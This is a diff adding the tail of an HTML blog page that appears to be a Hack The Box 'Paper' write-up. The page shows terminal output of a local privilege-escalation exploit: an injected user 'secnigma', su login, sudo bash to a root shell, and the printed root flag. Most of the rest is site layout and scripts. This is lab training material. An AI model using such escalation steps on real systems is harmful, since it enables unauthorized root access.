hash...</span><br><span class="line">[!] It looks like the password insertion was succesful!</span><br><span class="line">[!] Try to login as the injected user using su - secnigma</span><br><span class="line">[!] When prompted for password, enter your password</span><br><span class="line">[!] If the username is inserted, but the login fails; try running the exploit again.</span><br><span class="line">[!] If the login was succesful,simply enter &#x27;sudo bash&#x27; and drop into a root shell!</span><br><span class="line">[dwight@paper ~]$ su - secnigma</span><br><span class="line">Password:</span><br><span class="line">[secnigma@paper ~]$ sudo bash</span><br><span class="line">[sudo] password for secnigma:</span><br><span class="line">[root@paper secnigma]# cat /root/root.txt</span><br><span class="line">1cffe7d878909bf7f9dd79032d883e68</span><br></pre></td></tr></table></figure>
+    </article>
+    <!-- license -->
+        <div class="license-wrapper">
+            <p>Author：<a href="http://dawoxiansigema.github.io">Xu Haoxiang</a>
+            <p>Link：<a href="http://dawoxiansigema.github.io/2025/09/17/Paper/">http://dawoxiansigema.github.io/2025/09/17/Paper/</a>
+            <p>Publish date：<a href="http://dawoxiansigema.github.io/2025/09/17/Paper/">September 17th 2025, 12:37:12 pm</a>
+            <p>Update date：<a href="http://dawoxiansigema.github.io/2025/09/17/Paper/">September 18th 2025, 10:46:08 am</a>
+            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+        </li>
+        <li class="previous">
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2025/09/15/Devvortex/" title="Devvortex">
+                    <div class="prevTitle">Devvortex</div>
+                </a>
+        </li>
+    </ul>
+    <!-- comment -->
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+            
+            
+            
+            <!-- utteranc评论 -->
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+            
+            
+            
+        </div>
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    <!-- Mathjax -->
+</main>
+
+                <!-- profile -->
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+        <div class="social">
+                            <a href="mailto:2071970042@qq.com" class="iconfont-archer email" title="email" ></a>
+                <a href="//github.com/Dawoxiansigema" class="iconfont-archer github" target="_blank" title="github"></a>
+
+        </div>
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    <!-- 不蒜子  -->
+        <div class="busuanzi-container">
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+        </div>
+</footer>
+
+        </div>
+        <!-- toc -->
+            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shell-as-dwight"><span class="toc-number">2.</span> <span class="toc-text">Shell as dwight</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-17671"><span class="toc-number">2.1.</span> <span class="toc-text">CVE-2019-17671</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shell-as-dwight-1"><span class="toc-number">3.</span> <span class="toc-text">Shell as dwight</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shell-as-root"><span class="toc-number">4.</span> <span class="toc-text">Shell as root</span></a></li></ol>
+            </div>
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+        
+        
+        
+        
+        
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 5
+        </div>
+        <!-- search  -->
+    </div>
+    <div class="post-archive">
+            <div class="archive-year"> 2025 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/17</span>
+            <a class="archive-post-title" href="/2025/09/17/Paper/">Paper</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/15</span>
+            <a class="archive-post-title" href="/2025/09/15/Devvortex/">Devvortex</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/06</span>
+            <a class="archive-post-title" href="/2025/09/06/Msfvenom/">Msfvenom</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/06</span>
+            <a class="archive-post-title" href="/2025/09/06/SUID/">SUID</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/04</span>
+            <a class="archive-post-title" href="/2025/09/04/GoodGames/">GoodGames</a>
+        </li>
+            </ul>
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+            <span class="sidebar-tag-name" data-tags="HTB">
+                <span class="iconfont-archer">&#xe606;</span>
+                HTB
+            </span>
+            <span class="sidebar-tag-name" data-tags="工具">
+                <span class="iconfont-archer">&#xe606;</span>
+                工具
+            </span>
+            <span class="sidebar-tag-name" data-tags="提权">
+                <span class="iconfont-archer">&#xe606;</span>
+                提权
+            </span>
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://dawoxiansigema.github.io",
+        root: siteMetaRoot,
+        author: "Xu Haoxiang"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+        <!-- main func -->
+        <script src="/scripts/main.js"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
+        <!-- algolia -->
+        <!-- busuanzi -->
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        <!-- async load share.js -->
+            <script src="/scripts/share.js" async></script>
+        <!-- mermaid -->
+    </body>
+</html>
